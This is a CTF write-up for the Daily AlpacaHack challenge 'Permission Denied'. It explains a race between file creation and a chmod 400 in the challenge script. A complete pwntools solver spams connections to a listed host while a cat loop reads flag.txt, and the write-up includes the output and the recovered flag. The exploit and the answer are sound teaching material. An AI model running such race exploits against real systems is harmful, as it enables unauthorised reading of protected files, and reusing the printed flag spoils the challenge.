---
title: "Daily AlpacaHack: Permission Denied Writeup"
description: "At this point I don't know what to put here"
pubDate: 2026-04-30
tags: ["alpacahack", "misc", "unix permissions"]
---

This time in Daily AlpacaHack, we are "simple" challenge, read `flag.txt` from a Debian Trixie shell. The flag file was created by root and has the $400(8)$ permission, which means that only the owner (root) can read it. An important detail is that we are given a shell as the `nobody` user, which is a non-root user, but the file `flag.txt` is stored in our user home directory.

# The challenge

We are given both the connection to the shell (via netcat) and the source code to instance the challenge: `Dockerfile`, `docker-compose.yml` (not important), and `chal.sh` (which is the entrypoint of the container). Let's take a look at `chal.sh` and `Dockerfile`:

```dockerfile
FROM python:3.14.4-slim-trixie
RUN apt-get update && apt-get install -yq socat
WORKDIR /app
COPY --chmod=400 chal.sh ./
CMD ["socat", "tcp-listen:1337,fork,reuseaddr", "exec:'bash chal.sh',stderr,pty,ctty,setsid,echo=0"]
```

```bash
echo Alpaca{REDACTED} > flag.txt
chmod 400 flag.txt
runuser -u nobody -- sh
rm flag.txt
```

As we can see the `Dockerfile` sets up a Debian Trixie container with Python and socat installed, and it runs `chal.sh` when a connection is made to port 1337. And then `chal.sh` creates the `flag.txt` file with the flag, sets its permissions to `400`, and then runs a shell as the `nobody` user. After that, it deletes the `flag.txt` file.

There are some important details to note here, first of all the `flag.txt` deletion happens after the shell command is executed, but as runuser is a blocking call, the deletion will only happen after we exit the shell. Another important point is that the chal.sh script is called as is from the `exec` option of socat, so if we span multiple shells, the echo and chmod commands will be executed on each one, meaning on each new connection the flag is overwritten and THEN the permissions are set to `400`. This opens a race condition, which is the key to solving this challenge.

# The exploit

As we previously said, every time we connect to the shell, the `chal.sh` script is executed, which means that the `flag.txt` file is created (with the default permissions of `644`), and then in a next command, the permissions are set to `400`. This means that if we read the contents of the `flag.txt` file before the `chmod` command is executed, we can read the flag while the permissions are still `644`. So to exploit this we can:

1. In one terminal, connect to the shell, and execute a loop that continuously reads the contents of `flag.txt` and prints it to the terminal (it will most of the time simply print "permission denied").

2. Then we can start spanning new shells in another process, which will trigger the `chal.sh` script and create the `flag.txt` file with the flag, and then set its permissions to `400`. If the timing and scheduling of the processes are right, we will align the read of the flag with the step in `chal.sh` where the flag is created but the `chmod` command has not yet been executed, allowing us to read the flag before the permissions are changed.

# Solver

Let's take a look at the solver script:

We start by importing the necessary libraries and defining the host and port of the challenge.

```python
from pwn import *
import threading

HOST = '34.170.146.252'
PORT = 31900
```

Now we define a helper function that will run on an independent thread, which will continuously spawn new shells to trigger the `chal.sh` script and create the `flag.txt` file, this will allow us to exploit the race condition and read the flag before the permissions are changed.

```python
def trigger():
    for _ in range(20):
        try:
            log.info(f"Triggering attempt {_+1}")
            r = remote(HOST, PORT, level='error')
            r.sendline(b'exit')
            r.close()
        except:
            pass
```

Now we init the main connection to the shell and make it continuously read the contents of `flag.txt` in a loop by running `while true; do cat flag.txt 2>/dev/null; done`, this will print the flag to the terminal whenever the `flag.txt` file is created and before its permissions are changed.

```python
log.info("Starting main connection to read the flag")
r = remote(HOST, PORT)
r.sendline(b'while true; do cat flag.txt 2>/dev/null; done')
```

Now we init in a new thread the `trigger` helper function.

```python
log.info("Started reading flag connection, now starting race condition trigger")
threading.Thread(target=trigger).start()
```

Finally, we receive any output from the main connection until the flag prefix `Alpaca{` is present, at this point we print simply print the flag and close the connection.

```python
r.recvuntil(b'Alpaca{')
flag = b'Alpaca{' + r.recvline().strip()

log.success(f"Flag recovered: {flag.decode()}")
r.close()
```

# Results

After running the solver we get the following output:

```log
python solver.py
[*] Starting main connection to read the flag
[+] Opening connection to 34.170.146.252 on port 31900: Done
[*] Started reading flag connection, now starting race condition trigger
[*] Triggering attempt 1
[*] Triggering attempt 2
[*] Triggering attempt 3
[*] Triggering attempt 4
[*] Triggering attempt 5
[+] Flag recovered: Alpaca{h4s_fu11_p3rm1ss10ns_0v3r_3v3ry7h1ng}
[*] Closed connection to 34.170.146.252 port 31900
[*] Triggering attempt 6
[*] Triggering attempt 7
[*] Triggering attempt 8
[*] Triggering attempt 9
[*] Triggering attempt 10
[*] Triggering attempt 11
[*] Triggering attempt 12
[*] Triggering attempt 13
[*] Triggering attempt 14
[*] Triggering attempt 15
[*] Triggering attempt 16
[*] Triggering attempt 17
[*] Triggering attempt 18
[*] Triggering attempt 19
[*] Triggering attempt 20
```

# Conclusion

As we can see, the solver successfully recovers the flag `Alpaca{h4s_fu11_p3rm1ss10ns_0v3r_3v3ry7h1ng}` in the 5th triggering attempt, as this is a non-deterministic vector it could vary between runs (so more than 20 triggers might be needed in some cases), but still it shows the main problem of the challenge, we are running 2 independet commands, one for creating the flag file and another for changing its permissions, as this isn't an atomic operation, the OS scheduler could schedule an operation between these 2 commands, allowing us to read the flag before the permissions are changed.

# Greetings

As always thanks to the Daily AlpacaHack team for hosting these daily challenges and specialy this time to minaminao as the admin of Daily AlpacaHack and author of this challenge, it was a fun challenge to solve, quite different to what I usually do, but either way it was nice to solve it~!
